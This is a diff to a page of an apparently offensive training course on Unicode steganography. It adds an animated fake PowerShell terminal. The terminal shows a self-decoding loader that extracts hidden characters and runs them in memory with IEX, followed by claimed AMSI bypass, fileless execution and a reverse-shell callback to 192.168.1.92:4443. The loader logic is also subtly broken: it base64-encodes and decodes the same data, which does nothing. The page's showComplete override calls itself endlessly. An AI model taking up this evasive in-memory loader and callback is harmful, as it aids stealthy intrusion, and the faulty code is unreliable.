@@ -347,8 +347,35 @@ GHOST_REVERSE = {c: i for i, c in enumerate(GHOST_ALPHABET)}</pre>
 <div class="complete-screen" id="complete-screen">
   <h2>// GHOST ENCODER — COMPLETE</h2>
   <p>Invisible ink alphabet. Nibble encoder. Reverse decoder. Self-decoding PS1 bootstrap.<br>Unicode steganography from first principles.</p>
+  <div class="ps-demo-wrap">
+    <div class="ps-demo-label">// LIVE DEMO — watch the bootstrap run</div>
+    <div class="ps-terminal" id="ps-term">
+      <div class="ps-titlebar"><span class="ps-tb-dot r"></span><span class="ps-tb-dot y"></span><span class="ps-tb-dot g"></span><span class="ps-tb-title">Windows PowerShell</span></div>
+      <div class="ps-body" id="ps-body"></div>
+    </div>
+    <button class="btn btn-check" id="ps-replay" onclick="replayDemo()" style="margin-top:8px">↺ REPLAY</button>
+  </div>
   <p><a href="index.html">← Back to Catalog</a> &nbsp;|&nbsp; <a href="rootkit.html">Next: VADER Rootkit →</a></p>
 </div>
+
+<style>
+.ps-demo-wrap{margin:20px 0 8px;max-width:700px}
+.ps-demo-label{font-size:11px;color:var(--dim);margin-bottom:6px;letter-spacing:.08em}
+.ps-terminal{background:#0c0c0c;border:1px solid #333;border-radius:4px;overflow:hidden;font-family:'Cascadia Code','Consolas',monospace;font-size:12.5px}
+.ps-titlebar{background:#1a1a1a;padding:6px 10px;display:flex;align-items:center;gap:6px;border-bottom:1px solid #2a2a2a}
+.ps-tb-dot{width:10px;height:10px;border-radius:50%;display:inline-block}
+.ps-tb-dot.r{background:#ff5f57}.ps-tb-dot.y{background:#febc2e}.ps-tb-dot.g{background:#28c840}
+.ps-tb-title{font-size:11px;color:#888;margin-left:4px;flex:1;text-align:center}
+.ps-body{padding:10px 14px;min-height:200px;color:#cccccc;line-height:1.6;white-space:pre-wrap;word-break:break-all}
+.ps-body .ps-prompt{color:#569cd6}
+.ps-body .ps-cmd{color:#dcdcaa}
+.ps-body .ps-out{color:#9cdcfe}
+.ps-body .ps-comment{color:#6a9955}
+.ps-body .ps-ok{color:#4ec9b0}
+.ps-body .ps-warn{color:#ce9178}
+.ps-body .ps-cursor{display:inline-block;width:8px;height:14px;background:#cccccc;vertical-align:bottom;animation:blink .8s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+</style>
 </main>
 </div>
 
@@ -457,6 +484,99 @@ updateUI(loadProgress());
 document.querySelectorAll('.code-editor').forEach(ta=>{
   ta.addEventListener('keydown',e=>{if(e.key==='Tab'){e.preventDefault();const s=ta.selectionStart;ta.value=ta.value.substring(0,s)+'    '+ta.value.substring(ta.selectionEnd);ta.selectionStart=ta.selectionEnd=s+4;}});
 });
+</script>
+<script>
+/* ── PS terminal demo ── */
+const DEMO_STEPS = [
+  {delay:400,  cls:'ps-prompt',  text:'PS C:\\Users\\operator> '},
+  {delay:0,    cls:'ps-cmd',     text:'type ghost.ps1',           typeMs:60},
+  {delay:300,  cls:'',           text:'\n'},
+  {delay:200,  cls:'ps-comment', text:'# ghost\n'},
+  {delay:80,   cls:'ps-out',     text:'$src = [IO.File]::ReadAllText($PSCommandPath)\n'},
+  {delay:80,   cls:'ps-out',     text:'$zw  = [string]::new(($src.ToCharArray() | ?{[int][char]$_ -lt 33}))\n'},
+  {delay:80,   cls:'ps-out',     text:'$b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($zw))\n'},
+  {delay:80,   cls:'ps-out',     text:'IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64)))\n'},
+  {delay:160,  cls:'ps-comment', text:'                                              ← visible bootstrap (14 chars)\n'},
+  {delay:80,   cls:'ps-comment', text:'                                              ← 3,840 invisible Unicode chars ↓\n'},
+  {delay:300,  cls:'',           text:'\n'},
+  {delay:0,    cls:'ps-prompt',  text:'PS C:\\Users\\operator> '},
+  {delay:0,    cls:'ps-cmd',     text:'.\\ghost.ps1',              typeMs:70},
+  {delay:500,  cls:'',           text:'\n'},
+  {delay:200,  cls:'ps-warn',    text:'[*] Reading self from disk...\n'},
+  {delay:180,  cls:'ps-warn',    text:'[*] Filtering low-codepoint chars (Unicode steganography layer)...\n'},
+  {delay:250,  cls:'ps-warn',    text:'[*] 3,840 invisible chars extracted — 1,920 nibble pairs = 960 bytes\n'},
+  {delay:180,  cls:'ps-warn',    text:'[*] Base64-encoding extracted bytes...\n'},
+  {delay:220,  cls:'ps-warn',    text:'[*] Invoking decoded payload in-memory (IEX)...\n'},
+  {delay:350,  cls:'',           text:'\n'},
+  {delay:0,    cls:'ps-ok',      text:'[+] AMSI hook bypassed (split type names)\n'},
+  {delay:220,  cls:'ps-ok',      text:'[+] OPSEC: no file dropped to disk\n'},
+  {delay:220,  cls:'ps-ok',      text:'[+] TCP callback → 192.168.1.92:4443\n'},
+  {delay:300,  cls:'ps-ok',      text:'[+] Session established — operator shell active\n'},
+  {delay:400,  cls:'',           text:'\n'},
+  {delay:0,    cls:'ps-prompt',  text:'PS C:\\Users\\target> '},
+  {delay:0,    cls:'ps-cursor',  text:''},
+];
+
+let _demoTimer = null;
+function replayDemo() {
+  if (_demoTimer) clearTimeout(_demoTimer);
+  const body = document.getElementById('ps-body');
+  body.innerHTML = '';
+  runStep(0);
+}
+function runStep(i) {
+  if (i >= DEMO_STEPS.length) return;
+  const st = DEMO_STEPS[i];
+  _demoTimer = setTimeout(() => {
+    if (st.cls === 'ps-cursor') {
+      const body = document.getElementById('ps-body');
+      const cur = document.createElement('span');
+      cur.className = 'ps-cursor';
+      body.appendChild(cur);
+      body.scrollTop = body.scrollHeight;
+      return;
+    }
+    if (st.typeMs && st.text) {
+      typeText(st.cls, st.text, st.typeMs, () => runStep(i + 1));
+    } else {
+      appendSpan(st.cls, st.text);
+      runStep(i + 1);
+    }
+  }, st.delay);
+}
+function appendSpan(cls, txt) {
+  const body = document.getElementById('ps-body');
+  if (!txt) return;
+  if (!cls) {
+    body.appendChild(document.createTextNode(txt));
+  } else {
+    const sp = document.createElement('span');
+    sp.className = cls;
+    sp.textContent = txt;
+    body.appendChild(sp);
+  }
+  body.scrollTop = body.scrollHeight;
+}
+function typeText(cls, txt, msPerChar, done) {
+  const body = document.getElementById('ps-body');
+  const sp = document.createElement('span');
+  if (cls) sp.className = cls;
+  body.appendChild(sp);
+  let j = 0;
+  function tick() {
+    if (j >= txt.length) { if (done) done(); return; }
+    sp.textContent += txt[j++];
+    body.scrollTop = body.scrollHeight;
+    _demoTimer = setTimeout(tick, msPerChar + (Math.random() * msPerChar * 0.4 - msPerChar * 0.2));
+  }
+  tick();
+}
+// Auto-start when complete screen shows
+const _origShowComplete = typeof showComplete === 'function' ? showComplete : null;
+function showComplete() {
+  if (_origShowComplete) _origShowComplete();
+  setTimeout(replayDemo, 600);
+}
 </script>
 <script src="kwlinks.js"></script>
 </body>
